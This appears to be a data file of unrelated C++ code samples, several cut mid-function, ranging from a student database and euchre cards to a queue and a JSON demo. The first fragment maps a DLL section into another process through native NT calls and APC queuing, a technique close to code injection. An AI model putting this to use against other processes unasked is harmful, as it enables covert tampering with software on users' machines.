status = bSynchronize ? RtlPrepareForProcessCloning() : STATUS_SUCCESS;\n\n\tif (0 <= status)\n\t{\n\t\tPS_CREATE_INFO createInfo = { sizeof(createInfo) };\n\n\t\tstatus = NtCreateUserProcess(ProcessHandle,\n\t\t\tThreadHandle, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL,\n\t\t\tProcessFlags, ThreadFlags, NULL, &createInfo, NULL);\n\n\t\tif (IsDebuggerPresent()) __debugbreak();\n\n\t\tif (bSynchronize) RtlCompleteProcessCloning(STATUS_PROCESS_CLONED == status);\n\t}\n\n\treturn status;\n}\n\nNTSTATUS OpenSection(_Out_ PHANDLE SectionHandle, _In_ PCWSTR lpLibFileName)\n{\n\tint len = 0;\n\tPWSTR buf = 0;\n\n\twhile (0 < (len = _snwprintf(buf, len, L\"\\\\KnownDlls\\\\%s\", lpLibFileName)))\n\t{\n\t\tif (buf)\n\t\t{\n\t\t\tUNICODE_STRING ObjectName;\n\t\t\tOBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName, OBJ_CASE_INSENSITIVE };\n\t\t\tRtlInitUnicodeString(&ObjectName, buf);\n\n\t\t\treturn NtOpenSection(SectionHandle, SECTION_MAP_EXECUTE, &oa);\n\t\t}\n\n\t\tbuf = (PWSTR)alloca(++len * sizeof(WCHAR));\n\t}\n\n\treturn STATUS_INTERNAL_ERROR;\n}\n\nNTSTATUS CreateSection(_Out_ PHANDLE SectionHandle, _In_ PCWSTR lpLibFileName)\n{\n\tint len = 0;\n\tPWSTR buf = 0;\n\n\twhile (0 < (len = _snwprintf(buf, len, L\"\\\\systemroot\\\\system32\\\\%s\", lpLibFileName)))\n\t{\n\t\tif (buf)\n\t\t{\n\t\t\tUNICODE_STRING ObjectName;\n\t\t\tOBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName, OBJ_CASE_INSENSITIVE };\n\t\t\tRtlInitUnicodeString(&ObjectName, buf);\n\n\t\t\tHANDLE hFile;\n\t\t\tIO_STATUS_BLOCK iosb;\n\t\t\tNTSTATUS status = NtOpenFile(&hFile, FILE_EXECUTE | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);\n\n\t\t\tif (0 <= status)\n\t\t\t{\n\t\t\t\tstatus = NtCreateSection(SectionHandle, SECTION_MAP_EXECUTE, 0, 0, PAGE_EXECUTE, SEC_IMAGE, hFile);\n\t\t\t\tNtClose(hFile);\n\t\t\t}\n\n\t\t\treturn status;\n\t\t}\n\n\t\tbuf = (PWSTR)alloca(++len * sizeof(WCHAR));\n\t}\n\n\treturn STATUS_INTERNAL_ERROR;\n}\n\nNTSTATUS CreateOrOpenSection(_Out_ PHANDLE SectionHandle, _In_ PCWSTR lpLibFileName)\n{\n\tNTSTATUS status = OpenSection(SectionHandle, lpLibFileName);\n\treturn 0 > status ? CreateSection(SectionHandle, lpLibFileName) : STATUS_SUCCESS;\n}\n\nstruct BAS {\n\tPVOID BaseAddress;\n\tNTSTATUS status;\n};\n\nvoid NTAPI OnApc(\n\t_In_opt_ PVOID ApcArgument1,\n\t_In_opt_ PVOID ApcArgument2,\n\t_In_opt_ PVOID ApcArgument3)\n{\n\treinterpret_cast<BAS*>(ApcArgument1)->BaseAddress = ApcArgument2;\n\treinterpret_cast<BAS*>(ApcArgument1)->status = (NTSTATUS)(ULONG_PTR)ApcArgument3;\n}\n\nNTSTATUS NotifyParent(_In_ HANDLE hThread, _In_ PVOID BaseAddress, _In_ BAS* p, NTSTATUS status)\n{\n\treturn NtQueueApcThread(hThread, OnApc, p, BaseAddress, (PVOID)(ULONG_PTR)status);\n}\n\nNTSTATUS DoRemoteMap(\n\t_In_ PCWSTR lpLibFileName, \n\t_In_ PCLIENT_ID ClientId, \n\t_In_ HANDLE hThread, \n\t_In_ BAS* p)\n{\n\tHANDLE hProcess, hSection;\n\t\n\tBOOL bPost = FALSE;\n\n\tNTSTATUS status;\n\t\n\tOBJECT_ATTRIBUTES oa = { sizeof(oa) };\n\n\tif (0 <= (status = NtOpenProcess(&hProcess, PROCESS_VM_OPERATION, &oa, ClientId)))\n\t{\n\t\tif (0 <= (status = CreateOrOpenSection(&hSection, lpLibFileName)))\n\t\t{\n\t\t\tSIZE_T ViewSize = 0;\n\t\t\tPVOID BaseAddress = 0;\n\n\t\t\t//////////////////////////////////////////////////////////////////////////\n\t\t\t//\n\t\t\t// ERROR: Unable to find system process ****\n\t\t\t// ERROR: The process being debugged has either exited or cannot be accessed\n\t\t\t// ERROR: Many commands will not work properly\n\t\t\t// ERROR: Module load event for unknown process\n\t\t\t//\n\t\t\t//////////////////////////////////////////////////////////////////////////\n\n\t\t\tstatus = ZwMapViewOfSection(hSection, hProcess, &BaseAddress,\n\t\t\t\t0, 0, 0, &ViewSize, ViewShare, 0, PAGE_EXECUTE);\n\n\t\t\tNtClose(hSection);\n\n\t\t\tif (0 <= status)\n\t\t\t{\n\t\t\t\tbPost = TRUE;\n\n\t\t\t\tif (0 > (status = NotifyParent(hThread, BaseAddress, p, status)))\n\t\t\t\t{\n\t\t\t\t\tZwUnmapViewOfSection(hProcess, BaseAddress);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tNtClose(hProcess);\n\t}\n\n\tif (!bPost) NotifyParent(hThread, 0, p, status);\n\n\treturn status;\n}\n\nNTSTATUS DoRemoteUnMap(\n\t_In_ PVOID BaseAddress,\n\t_In_ PCLIENT_ID ClientId,\n\t_In_ HANDLE hThread,\n\t_In_ BAS* p)\n{\n\tHANDLE hProcess;\n\n\tNTSTATUS status;\n\n\tOBJECT_ATTRIBUTES oa = { sizeof(oa) };\n\n\tif (0 <= (status = NtOpenProcess(&hProcess, PROCESS_VM_OPERATION, &oa, ClientId)))\n\t{\n\t\tstatus = ZwUnmapViewOfSection(hProcess, BaseAddress);\n\n\t\tNtClose(hProcess);\n\t}\n\n\tNotifyParent(hThread, BaseAddress, p, status);\n\n\t",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"trading_jutsu_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\nusing namespace std;\n\nclass Student {\nprivate:\n    string name;\n    int id;\n    int age;\n    string major;\n\npublic:\n    Student() : name(\"No name\"), id(0), age(0), major(\"No major\") {}\n    Student(string n, int i, int a, string m) : name(n), id(i), age(a), major(m) {}\n    void Show() {\n        cout << \"ID: \" << id << \", Name: \" << name << \", Age: \" << age << \", Major: \" << major << endl;\n    }\n    void Input() {\n        cout << \"Enter ID: \";\n        cin >> id;\n        cout << \"Enter name: \";\n        cin >> name;\n        cout << \"Enter age: \";\n        cin >> age;\n        cout << \"Enter major: \";\n        cin >> major;\n    }\n    void writeToFile(ofstream& fout) {\n        if (fout.is_open()) {\n            fout << id << \" \" << name << \" \" << age << \" \" << major << endl;\n        }\n        else {\n            cout << \"Could not write to file\" << endl;\n        }\n    }\n    static Student readFromFile(ifstream& fin) {\n        int id, age;\n        string name, major;\n        fin >> id >> name >> age >> major;\n        return Student(name, id, age, major);\n    }\n    int getId() { return id; }\n    string getName() { return name; }\n    int getAge() { return age; }\n    string getMajor() { return major; }\n\n    void setName(string n) { name = n; }\n    void setAge(int a) { age = a; }\n    void setMajor(string m) { major = m; }\n};\nclass StudentDatabase {\nprivate:\n    Student** students;\n    int capacity;\n    int count;\n    void resize() {\n        capacity *= 2;\n        Student** newStudents = new Student * [capacity];\n        for (int i = 0; i < count; ++i) {\n            newStudents[i] = students[i];\n        }\n        delete[] students;\n        students = newStudents;\n    }\npublic:\n    StudentDatabase(int capacity) : capacity(capacity), count(0) {\n        students = new Student * [capacity];\n    }\n       ~StudentDatabase() {\n        for (int i = 0; i < count; ++i) {\n            delete students[i];\n        }\n        delete[] students;\n    }\n    void addStudent(Student& student) {\n        if (count == capacity) {\n            resize();\n        }\n        students[count++] = new Student(student);\n    }\n    void removeStudent(int id) {\n        for (int i = 0; i < count; ++i) {\n            if (students[i]->getId() == id) {\n                delete students[i];\n                for (int j = i; j < count - 1; ++j) {\n                    students[j] = students[j + 1];\n                }\n                return;\n            }\n        }\n        cout << \"Student with ID \" << id << \" not found.\" << endl;\n    }\n    Student* findStudent(int id) {\n        for (int i = 0; i < count; ++i) {\n            if (students[i]->getId() == id) {\n                return students[i];\n            }\n        }\n        return nullptr;\n    }\n    void listStudents() {\n        for (int i = 0; i < count; ++i) {\n            students[i]->Show();\n        }\n    }\n    void saveToFile(const string& filename) {\n        ofstream outFile(filename);\n        if (!outFile.is_open()) {\n            cout << \"Error opening file for writing.\" << endl;\n            return;\n        }\n        for (int i = 0; i < count; ++i) {\n            students[i]->writeToFile(outFile);\n        }\n        outFile.close();\n    }\n    void loadFromFile(const string& filename) {\n        ifstream inFile(filename);\n        if (!inFile) {\n            cout << \"Error opening file for reading.\" << endl;\n            return;\n        }\n        count = 0;\n        while (!inFile.eof()) {\n            Student student = Student::readFromFile(inFile);\n            if (inFile.fail()) break;\n            addStudent(student);\n        }\n        inFile.close();\n    }\n    void updateStudent(int id, Student& newData) {\n        Student* student = findStudent(id);\n        if (student) {\n            student->setName(newData.getName());\n            student->setAge(newData.getAge());\n            student->setMajor(newData.getMajor());\n        }\n        else {\n            cout << \"Student with ID \" << id << \" not found.\" << endl;\n        }\n    }\n    void filterByMajor(string major) {\n        for (int i = 0; i < count; ++i) {\n            if (students[i]->getMajor() == major) {\n                students[i]->Show();\n            }\n        }\n    }\n};\nvoid printMenu() {\n    cout << \"Menu:\" << endl;\n    cout << \"1. Add Student\" << endl;\n    cout << \"2. Remove Student\" << endl;\n    cout << \"3. Find Student\" << endl;\n    cout << \"4. List All Students\" << endl;\n    cout << \"5. Save to File\" << endl;\n    cout << \"6. Load from File\" << endl;\n    cout << \"Enter your choice: \";\n}\nvoid run() {\n    StudentDatabase db(10);\n    string choice;\n    while (true) {\n        printMenu();\n        cin >> choice;\n        switch (stoi(choice)) {\n        case 1: {\n            Student student;\n            student.Input();\n            db.addStudent(student);\n            break;\n        }\n        case 2: {\n            int id;\n            cout << \"Enter ID of the student to remove: \";\n            cin >> id;\n            db.",
    "#include \"World.h\"\r\n#include \"Organism.h\"\r\n#include <string>\r\n#include <iostream>\r\n#include <algorithm>\r\n\r\n#include \"Organism.h\"\r\n#include \"Animal.h\"\r\n#include \"Wolf.h\"\r\n#include \"Antylope.h\"\r\n#include \"Human.h\"\r\n#include \"Fox.h\"\r\n#include \"Turtle.h\"\r\n#include \"Sheep.h\"\r\n\r\n#include \"Plant.h\"\r\n#include \"Grass.h\"\r\n#include \"Guarana.h\"\r\n#include \"Sow.h\"\r\n#include \"Belladona.h\"\r\n#include \"Hogweed.h\"\r\n#include <string>\r\n#include <iostream>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <thread> // Include this for std::this_thread::sleep_for\r\n#include <chrono> // Include this for std::chrono::seconds\r\nusing namespace std;\r\n\r\nWorld::World(int N, int M)\r\n{\r\n    rows = N;\r\n    columns = M;\r\n    grid = new char* [rows];\r\n    for (int i = 0; i < rows; ++i) {\r\n        grid[i] = new char[columns];\r\n    }\r\n    for (int i = 0; i < rows; ++i) {\r\n        for (int j = 0; j < columns; ++j) {\r\n            grid[i][j] = ' ';\r\n        }\r\n    }\r\n}\r\n\r\nvoid World::CreateWorld(InfoTeller& info)\r\n{\r\n    \r\n    Organism* fox1 = new Fox(2, 16, this, &info);\r\n    AddOrganism(fox1);\r\n    Organism* fox2 = new Fox(8, 13, this, &info);\r\n    AddOrganism(fox2);\r\n\r\n    Organism* wolf = new Wolf(14, 7, this, &info);\r\n    AddOrganism(wolf);\r\n    Organism* wolf2 = new Wolf(14, 8, this, &info);\r\n    AddOrganism(wolf2);\r\n\r\n    Organism* antylope = new Antylope(16,12,this, &info);\r\n    AddOrganism(antylope);\r\n    Organism* antylope2 = new Antylope(10,10,this, &info);\r\n    AddOrganism(antylope2);\r\n\r\n    Organism* human = new Human(this, &info);\r\n    AddOrganism(human);\r\n\r\n    Organism* sheep = new Sheep(1,2,this, &info);\r\n    AddOrganism(sheep);\r\n    Organism* sheep1 = new Sheep(10,2,this, &info);\r\n    AddOrganism(sheep1);\r\n\r\n    Organism* turtle = new Turtle(9,3,this, &info);\r\n    AddOrganism(turtle);\r\n    Organism* turtle1 = new Turtle(17,8,this, &info);\r\n    AddOrganism(turtle1);\r\n\r\n    Organism* grass = new Grass(this, &info);\r\n    AddOrganism(grass);\r\n\r\n    Organism* sow = new Sow(this, &info);\r\n    AddOrganism(sow);\r\n    \r\n    Organism* hogweed = new Hogweed(this, &info); \r\n    AddOrganism(hogweed);\r\n\r\n    Organism* belladona = new Belladona(this, &info);\r\n    AddOrganism(belladona);\r\n\r\n    Organism* guarana = new Guarana(this, &info);\r\n    AddOrganism(guarana);       \r\n\r\n}\r\n\r\n\r\nvoid World::SaveWorld(const string & filename)\r\n{\r\n    ofstream file(filename, ios::trunc);\r\n    if (file.is_open()) {\r\n        for (const auto& org : organisms) {\r\n            file << org->GetStrenght() << '\\n' << org->GetInitiative() << '\\n'\r\n                << org->GetSymbol() << '\\n' << org->GetPositionX() << '\\n'\r\n                << org->GetPositionY() << '\\n' << org->GetAge() << endl;\r\n            if (org->GetSymbol() == 'H')\r\n            {\r\n                Human* humanPtr = dynamic_cast<Human*>(org);\r\n                file << humanPtr->GetDuration() << endl;\r\n            }\r\n        }\r\n        cout << \"Organisms saved to file: \" << filename << endl;\r\n    }\r\n    else {\r\n        cerr << \"Unable to open file: \" << filename << endl;\r\n    }\r\n}\r\n\r\nvoid World::AddOrganism(Organism* organism)\r\n{\r\n    int x = organism->GetPositionX();\r\n    int y = organism->GetPositionY();\r\n    if (x >= 0 && x < columns && y >= 0 && y < rows) {\r\n        grid[x][y] = organism->GetSymbol();\r\n        organisms.push_back(organism);\r\n\r\n    }\r\n}\r\n\r\nvoid World::LoadWorld(const std::string & filename, InfoTeller * info)\r\n{\r\n    std::ifstream file(filename);\r\n    if (file.is_open()) {\r\n        string a = \" \";\r\n        int strenght, initiative, positionX, positionY, age, duration = 0;\r\n        char symbol;\r\n        while (getline(file, a)) {\r\n            strenght = stoi(a);\r\n            getline(file, a);\r\n            initiative = stoi(a);\r\n            getline(file, a);\r\n            symbol = a[0];\r\n            getline(file, a);\r\n            positionX = stoi(a);\r\n            getline(file, a);\r\n            positionY = stoi(a);\r\n            getline(file, a);\r\n            age = stoi(a);\r\n\r\n            Organism* add = nullptr;\r\n            if (symbol == 'H')    \r\n            {\r\n                add = new Human(this, info);\r\n                add->SetPosition(positionX, positionY);\r\n                getline(file, a);\r\n                duration = stoi(a);\r\n                Human* humanPtr = dynamic_cast<Human*>(add);\r\n                humanPtr->SetDuration(duration);\r\n            }\r\n            else if(symbol=='W')\r\n                add = new Wolf(positionX,positionY,this, info);\r\n            else if (symbol == 'S')\r\n                add = new Sheep(positionX, positionY, this, info);\r\n            else if (symbol == 'F')\r\n                add = new Fox(positionX, positionY, this, info);\r\n            else if (symbol == 'A')\r\n                add = new Antylope(positionX, positionY, this, info);\r\n            else if (symbol == 'T')\r\n                add = new Turtle(positionX, positionY, this, info);\r\n            else if (symbol == 'b')\r\n                add = new Belladona( this, info);\r\n            else if (symbol == 'u",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct Queue{ //circular queue using array\nprivate:\n    int queue[100], SIZE = 100, front = -1, rear = -1;\npublic:\n    void enqueue(int val){\n        if(isFull()){\n            cout << \"the queue is full\" << endl;\n        }\n        else if(isEmpty()){\n            rear = front = 0;\n            queue[rear] = val;\n        }\n        else{\n            rear = (rear + 1) % SIZE;\n            queue[rear] = val;\n        }\n    };\n\n    void dequeue(){\n        if(isEmpty()){\n            cout << \"the queue is empty\" << endl;\n        }\n        else if(front == rear){ // have one element\n            front = rear = -1;\n        }\n        else{\n            front = (front + 1) % SIZE;\n        }\n    };\n    void display_queue(){\n        if(isEmpty()){\n            cout << \"the queue is empty!\" << endl;\n        }\n        else {\n            int i = front, j = rear;\n\n            if((rear + 1) % SIZE == front){\n                cout << queue[front] << \" \";\n                i++; \n                i %= SIZE;\n            }\n            while((i % SIZE) != ((j + 1) % SIZE)){\n                cout << queue[i] << \" \";\n                i++;\n                i %= SIZE;\n            }\n            cout << endl;\n        }\n    };\n    int get_front(){\n        if(isEmpty()){\n            cout << \"queue is empty!\" << endl;\n            return -1;\n        }\n        else{\n            return queue[front];\n        }\n    }\n    bool isEmpty(){\n        return (front == -1);\n    }\n    bool isFull(){\n        return (front == (rear + 1) % SIZE);\n        // (front = rear + 1) || (front == 0 && rear == size - 1). \n    }\n\n\n};\n\nint main()\n{\n    Queue q;\n    q.enqueue(1);\n    q.enqueue(2);\n    q.enqueue(3);\n    q.enqueue(4);\n    cout << \"Front : \" << q.get_front() << endl;\n    cout << \"queue : \";\n    q.display_queue();\n\n    q.dequeue();\n    q.dequeue();\n\n    cout << \"Front : \" << q.get_front() << endl;\n    cout << \"queue : \";\n    q.display_queue();\n\n    cout << \"Front : \" << q.get_front() << endl;\n    cout << \"queue : \";\n    q.display_queue();\n\n    q.enqueue(3);\n    q.enqueue(4);\n\n    cout << \"Front : \" << q.get_front() << endl;\n    cout << \"queue : \";\n    q.display_queue();\n\n    q.dequeue();\n    cout << \"Front : \" << q.get_front() << endl;\n    q.dequeue();\n    cout << \"Front : \" << q.get_front() << endl;\n    q.dequeue();\n    cout << \"Front : \" << q.get_front() << endl;\n    cout << \"queue : \";\n    q.display_queue();\n\n    q.dequeue();\n    cout << \"Front : \" << q.get_front() << endl;\n}",
    "#include \"json.hpp\"\nusing json = nlohmann::json;\n\n#include <iostream>\n#include <vector>\n#include <map>\n#include <string>\nusing namespace std;\n\n// json\u5e8f\u5217\u5316\u793a\u4f8b1\nstring func1()\n{\n    json js;\n    js[\"msg_type\"] = 2;\n    js[\"from\"] = \"zhang san\";\n    js[\"to\"] = \"li si\";\n    js[\"msg\"] = \"hello, what are you doing now?\";\n\n    string sendBuf = js.dump();\n    //cout<<sendBuf.c_str()<<endl;\n    return sendBuf;\n}\n\n// json\u5e8f\u5217\u5316\u793a\u4f8b2\nstring func2()\n{\n    json js;\n    // \u6dfb\u52a0\u6570\u7ec4\n    js[\"id\"] = {1, 2, 3, 4, 5};\n    // \u6dfb\u52a0key-value\n    js[\"name\"] = \"zhang san\";\n    // \u6dfb\u52a0\u5bf9\u8c61\n    js[\"msg\"][\"zhang san\"] = \"hello world\";\n    js[\"msg\"][\"liu shuo\"] = \"hello china\";\n    // \u4e0a\u9762\u7b49\u540c\u4e8e\u4e0b\u9762\u8fd9\u53e5\u4e00\u6b21\u6027\u6dfb\u52a0\u6570\u7ec4\u5bf9\u8c61\n    js[\"msg\"] = {{\"zhang san\", \"hello world\"}, {\"liu shuo\", \"hello china\"}};\n    //cout << js << endl;\n    return js.dump();\n}\n\n// json\u5e8f\u5217\u5316\u793a\u4f8b\u4ee3\u78013\nstring func3()\n{\n    json js;\n\n    // \u76f4\u63a5\u5e8f\u5217\u5316\u4e00\u4e2avector\u5bb9\u5668\n    vector<int> vec;\n    vec.push_back(1);\n    vec.push_back(2);\n    vec.push_back(5);\n\n    js[\"list\"] = vec;\n\n    // \u76f4\u63a5\u5e8f\u5217\u5316\u4e00\u4e2amap\u5bb9\u5668\n    map<int, string> m;\n    m.insert({1, \"\u633a\u597d\u7684?\"});\n    m.insert({2, \"\u534e\u5c71\"});\n    m.insert({3, \"\u6cf0\u5c71\"});\n\n    js[\"path\"] = m;\n\n    string sendBuf = js.dump(); // json\u6570\u636e\u5bf9\u8c61 =\u300b\u5e8f\u5217\u5316 json\u5b57\u7b26\u4e32\n    //cout<<sendBuf<<endl;\n    return sendBuf;\n}\n\nint main()\n{\n    string recvBuf = func1();\n    // \u6570\u636e\u7684\u53cd\u5e8f\u5217\u5316   json\u5b57\u7b26\u4e32 =\u300b\u53cd\u5e8f\u5217\u5316 \u6570\u636e\u5bf9\u8c61\uff08\u770b\u4f5c\u5bb9\u5668\uff0c\u65b9\u4fbf\u8bbf\u95ee\uff09\n    json jsbuf = json::parse(recvBuf);\n    cout<<jsbuf[\"msg_type\"]<<endl;\n    cout<<jsbuf[\"from\"]<<endl;\n    cout<<jsbuf[\"to\"]<<endl;\n    cout<<jsbuf[\"msg\"]<<endl;\n\n    // cout<<jsbuf[\"id\"]<<endl;\n    // auto arr = jsbuf[\"id\"];\n    // cout<<arr[2]<<endl;\n\n    // auto msgjs = jsbuf[\"msg\"];\n    // cout<<msgjs[\"zhang san\"]<<endl;\n    // cout<<msgjs[\"liu shuo\"]<<endl;\n\n    // vector<int> vec = jsbuf[\"list\"]; // js\u5bf9\u8c61\u91cc\u9762\u7684\u6570\u7ec4\u7c7b\u578b\uff0c\u76f4\u63a5\u653e\u5165vector\u5bb9\u5668\u5f53\u4e2d\n    // for (int &v : vec)\n    // {\n    //     cout << v << \" \";\n    // }\n    // cout << endl;\n\n    // map<int, string> mymap = jsbuf[\"path\"];\n    // for (auto &p : mymap)\n    // {\n    //     cout << p.first << \" \" << p.second << endl;\n    // }\n    // cout << endl;\n\n    return 0;\n}",
    "#include \"Card.h\"\n#include <cassert>\n\nusing namespace std;\nCard::Card(const string &rank_in, const string &suit_in) {\n    assert(rank_in == RANK_TWO || rank_in == RANK_THREE || rank_in == RANK_FOUR ||\n           rank_in == RANK_FIVE || rank_in == RANK_SIX || rank_in == RANK_SEVEN ||\n           rank_in == RANK_EIGHT || rank_in == RANK_NINE || rank_in == RANK_TEN ||\n           rank_in == RANK_JACK || rank_in == RANK_QUEEN || rank_in == RANK_KING ||\n           rank_in == RANK_ACE);\n    assert(suit_in == SUIT_SPADES || suit_in == SUIT_HEARTS ||\n           suit_in == SUIT_CLUBS || suit_in == SUIT_DIAMONDS);\n    rank = rank_in;\n    suit = suit_in;\n}\n// default card is Two of Spades\nCard::Card(): Card(RANK_TWO, SUIT_SPADES)\n{}\n\nstring Card::get_rank() const {\n    return rank;\n}\n\nstring Card::get_suit() const {\n    return suit;\n}\n\nstring Card::get_suit(const string &trump) const {\n    assert(trump == SUIT_SPADES || trump == SUIT_HEARTS ||\n           trump == SUIT_CLUBS || trump == SUIT_DIAMONDS);\n    // if the card is the left bower, it is still trump, so return its suit as\n    // trump\n    if (is_left_bower(trump)) {\n        return trump;\n    }\n    // all other cards should just have their own suit as the returned suit\n    return suit;\n}\n\nbool Card::is_face() const {\n    // if rank is Jack, King, Queen, or Ace, it is a face card\n    return (rank == RANK_JACK || rank == RANK_QUEEN ||\n            rank == RANK_KING || rank == RANK_ACE);\n}\n\nbool Card::is_right_bower(const string &trump) const {\n    assert(trump == SUIT_SPADES || trump == SUIT_HEARTS ||\n        trump == SUIT_CLUBS || trump == SUIT_DIAMONDS);\n    // Jack of trump suit is right bower\n    return ((suit == trump) && (rank == RANK_JACK));\n}\nbool Card::is_left_bower(const string &trump) const {\n    assert(trump == SUIT_SPADES || trump == SUIT_HEARTS ||\n           trump == SUIT_CLUBS || trump == SUIT_DIAMONDS);\n    // Jack of same colored suit as trump is left bower\n    return (rank == RANK_JACK && suit == Suit_next(trump));\n}\n\nbool Card::is_trump(const string &trump) const {\n    assert(trump == SUIT_SPADES || trump == SUIT_HEARTS ||\n           trump == SUIT_CLUBS || trump == SUIT_DIAMONDS);\n    // if the suit is trump, or it's the left bower, it's a trump card\n    return ((trump == suit) || (is_left_bower(trump)));\n}\n\nbool operator<(const Card &lhs, const Card &rhs) {\n    int left = 0, right = 0;\n    // find which rank the left and right cards are\n    while (RANK_NAMES_BY_WEIGHT[left] != lhs.get_rank()) {\n        left++;\n    }\n    while (RANK_NAMES_BY_WEIGHT[right] != rhs.get_rank()) {\n        right++;\n    }\n    // if they are not the same rank, we are done; the lowest card is whichever\n    // is the lowest rank\n    if (left != right) {\n        return left < right;\n    }\n    // if they are the same rank, find which suit is highest according to the\n    // specification Diamonds > Clubs > Hearts > Spades\n    else {\n        left = 0;\n        right = 0;\n        int left = 0, right = 0;\n        while (SUIT_NAMES_BY_WEIGHT[left] != lhs.get_suit()) {\n            left++;\n        }\n        while (SUIT_NAMES_BY_WEIGHT[right] != rhs.get_suit()) {\n            right++;\n        }\n        return left < right;\n    }\n}\n\nbool operator>(const Card &lhs, const Card &rhs) {\n    int left = 0, right = 0;\n    // find which rank the left and right cards are\n    while (RANK_NAMES_BY_WEIGHT[left] != lhs.get_rank()) {\n        left++;\n    }\n    while (RANK_NAMES_BY_WEIGHT[right] != rhs.get_rank()) {\n        right++;\n    }\n    // if they are not the same rank, we are done; the highest card is whichever\n    // is the highest rank\n    if (left != right) {\n        return left > right;\n    }\n    // if they are the same rank, find which suit is highest according to the\n    // specification Diamonds > Clubs > Hearts > Spades\n    else {\n        left = 0;\n        right = 0;\n        int left = 0, right = 0;\n        while (SUIT_NAMES_BY_WEIGHT[left] != lhs.get_suit()) {\n            left++;\n        }\n        while (SUIT_NAMES_BY_WEIGHT[right] != rhs.get_suit()) {\n            right++;\n        }\n        return left > right;\n    }\n}\n\nbool operator==(const Card &lhs, const Card &rhs) {\n    // if !(lhs < rhs) and !(lhs, > rhs), then lhs must be equal to rhs\n    return !(operator<(lhs, rhs) || operator>(lhs, rhs));\n}\n\nbool operator!=(const Card &lhs, const Card &rhs) {\n    // if the lhs does not equal the right hand side . . .\n    return !operator==(lhs, rhs);\n}\n\nstring Suit_next(const string &suit) {\n    assert(suit == Card::SUIT_SPADES || suit == Card::SUIT_HEARTS ||\n           suit == Card::SUIT_CLUBS || suit == Card::SUIT_DIAMONDS);\n    // If the suit is red, return the other red suit. If the suit is black,\n    // return the other black suit.\n    if (suit == Card::SUIT_CLUBS) {\n        return Card::SUIT_SPADES;\n    }\n    if (suit == Card::SUIT_SPADES) {\n        return Card::SUIT_CLUBS;\n    }\n    if (suit == Card::SUIT_DIAMONDS) {\n        return Card::SUIT_HEARTS;\n    }\n    return Card::SUIT_DIAMONDS;",
    "#include <iostream>\r\n#include <math.h>\r\n#include <stack>\r\nusing namespace std;\r\n\r\nint calculate(int val1, int val2, char operatorr) {\r\n    if (operatorr == '^')\r\n        return pow(val1, val2);\r\n\r\n    if (operatorr == '+')\r\n        return (val1 + val2);\r\n\r\n    if (operatorr == '-')\r\n        return (val1 - val2);\r\n\r\n    if (operatorr == '*')\r\n        return (val1 * val2);\r\n\r\n    if (operatorr == '/')\r\n        return (val1 / val2);\r\n    \r\n    return 0;\r\n}\r\n\r\nint evaluate(string &st) {\r\n    stack<int> stac;\r\n\r\n    for (int i = 0; i < st.size(); i++) {\r\n        if (st[i] == '^' || st[i] == '+' || st[i] == '-' || st[i] == '*' || st[i] == '/') {\r\n            int val1 = stac.top();\r\n            stac.pop();\r\n            int val2 = stac.top();\r\n            stac.pop();\r\n            int result = calculate(val2, val1, st[i]);\r\n            stac.push(result);\r\n        } else {\r\n            stac.push(st[i] - '0');\r\n        }\r\n    }\r\n    return stac.top();\r\n}\r\n\r\nint main() {\r\n    string str = \"12+89-*\";\r\n    cout << str << \" = \" << evaluate(str);\r\n    return 0;\r\n}\r\n",
    "#include \"funciones.h\"\n\nvoid database_in (vector<input> &data_hub){//funcion para exportar los datos del txt al programa.\n    bool confiry = false, confirm = false, confird = false; \n    string word; \n    input data; \n    string texto; \n    ifstream database; \n    database.open(\"database.txt\", ios::in); \n    if (database.fail()){ \n        cout<<\"No se encontro el archivo se va a proceder a crear uno nuevo...\";\n        database.open(\"database.txt\",ios::app);\n        cout<<endl;\n        return ;\n    }\n    while (!database.eof()){ \n      getline(database,texto); \n        for (int i = 0; i < texto.size(); ++i){ \n            if (texto[i] != 'y' && confiry == false){ \n                word=word+texto[i];\n            }\n            if (texto[i] == 'y' && confiry == false){ \n                confiry = true;\n                data.year = stoi(word);\n                word = \"\";\n                continue;\n            }\n            if (texto[i] != 'm' && confirm == false && confiry == true){\n                word = word + texto[i];\n            }\n            if (texto[i] == 'm' &&  confirm == false && confiry == true){\n                confirm = true;\n                data.month = stoi(word);\n                word = \"\";\n                continue;\n            }\n            if (texto[i] != 'd' && confird == false && confiry == true && confirm == true){\n                word = word + texto[i];\n            }\n            if (texto[i] == 'd' && confird == false && confiry == true && confirm == true){\n                confird = true;\n                data.day = stoi(word);\n                word = \"\";\n                continue;\n            }\n            if (confird == true && confiry == true && confirm == true){ \n                word = word + texto[i];\n           }\n        }\n        //guarda la ultima palabra \"event\"  limpia word y limpia los bool y hace pushback para continuar con la otra linea\n        data.event = word;\n        word = \"\";\n        confiry = false, confirm = false, confird = false; \n        data_hub.push_back(data);\n    }\n    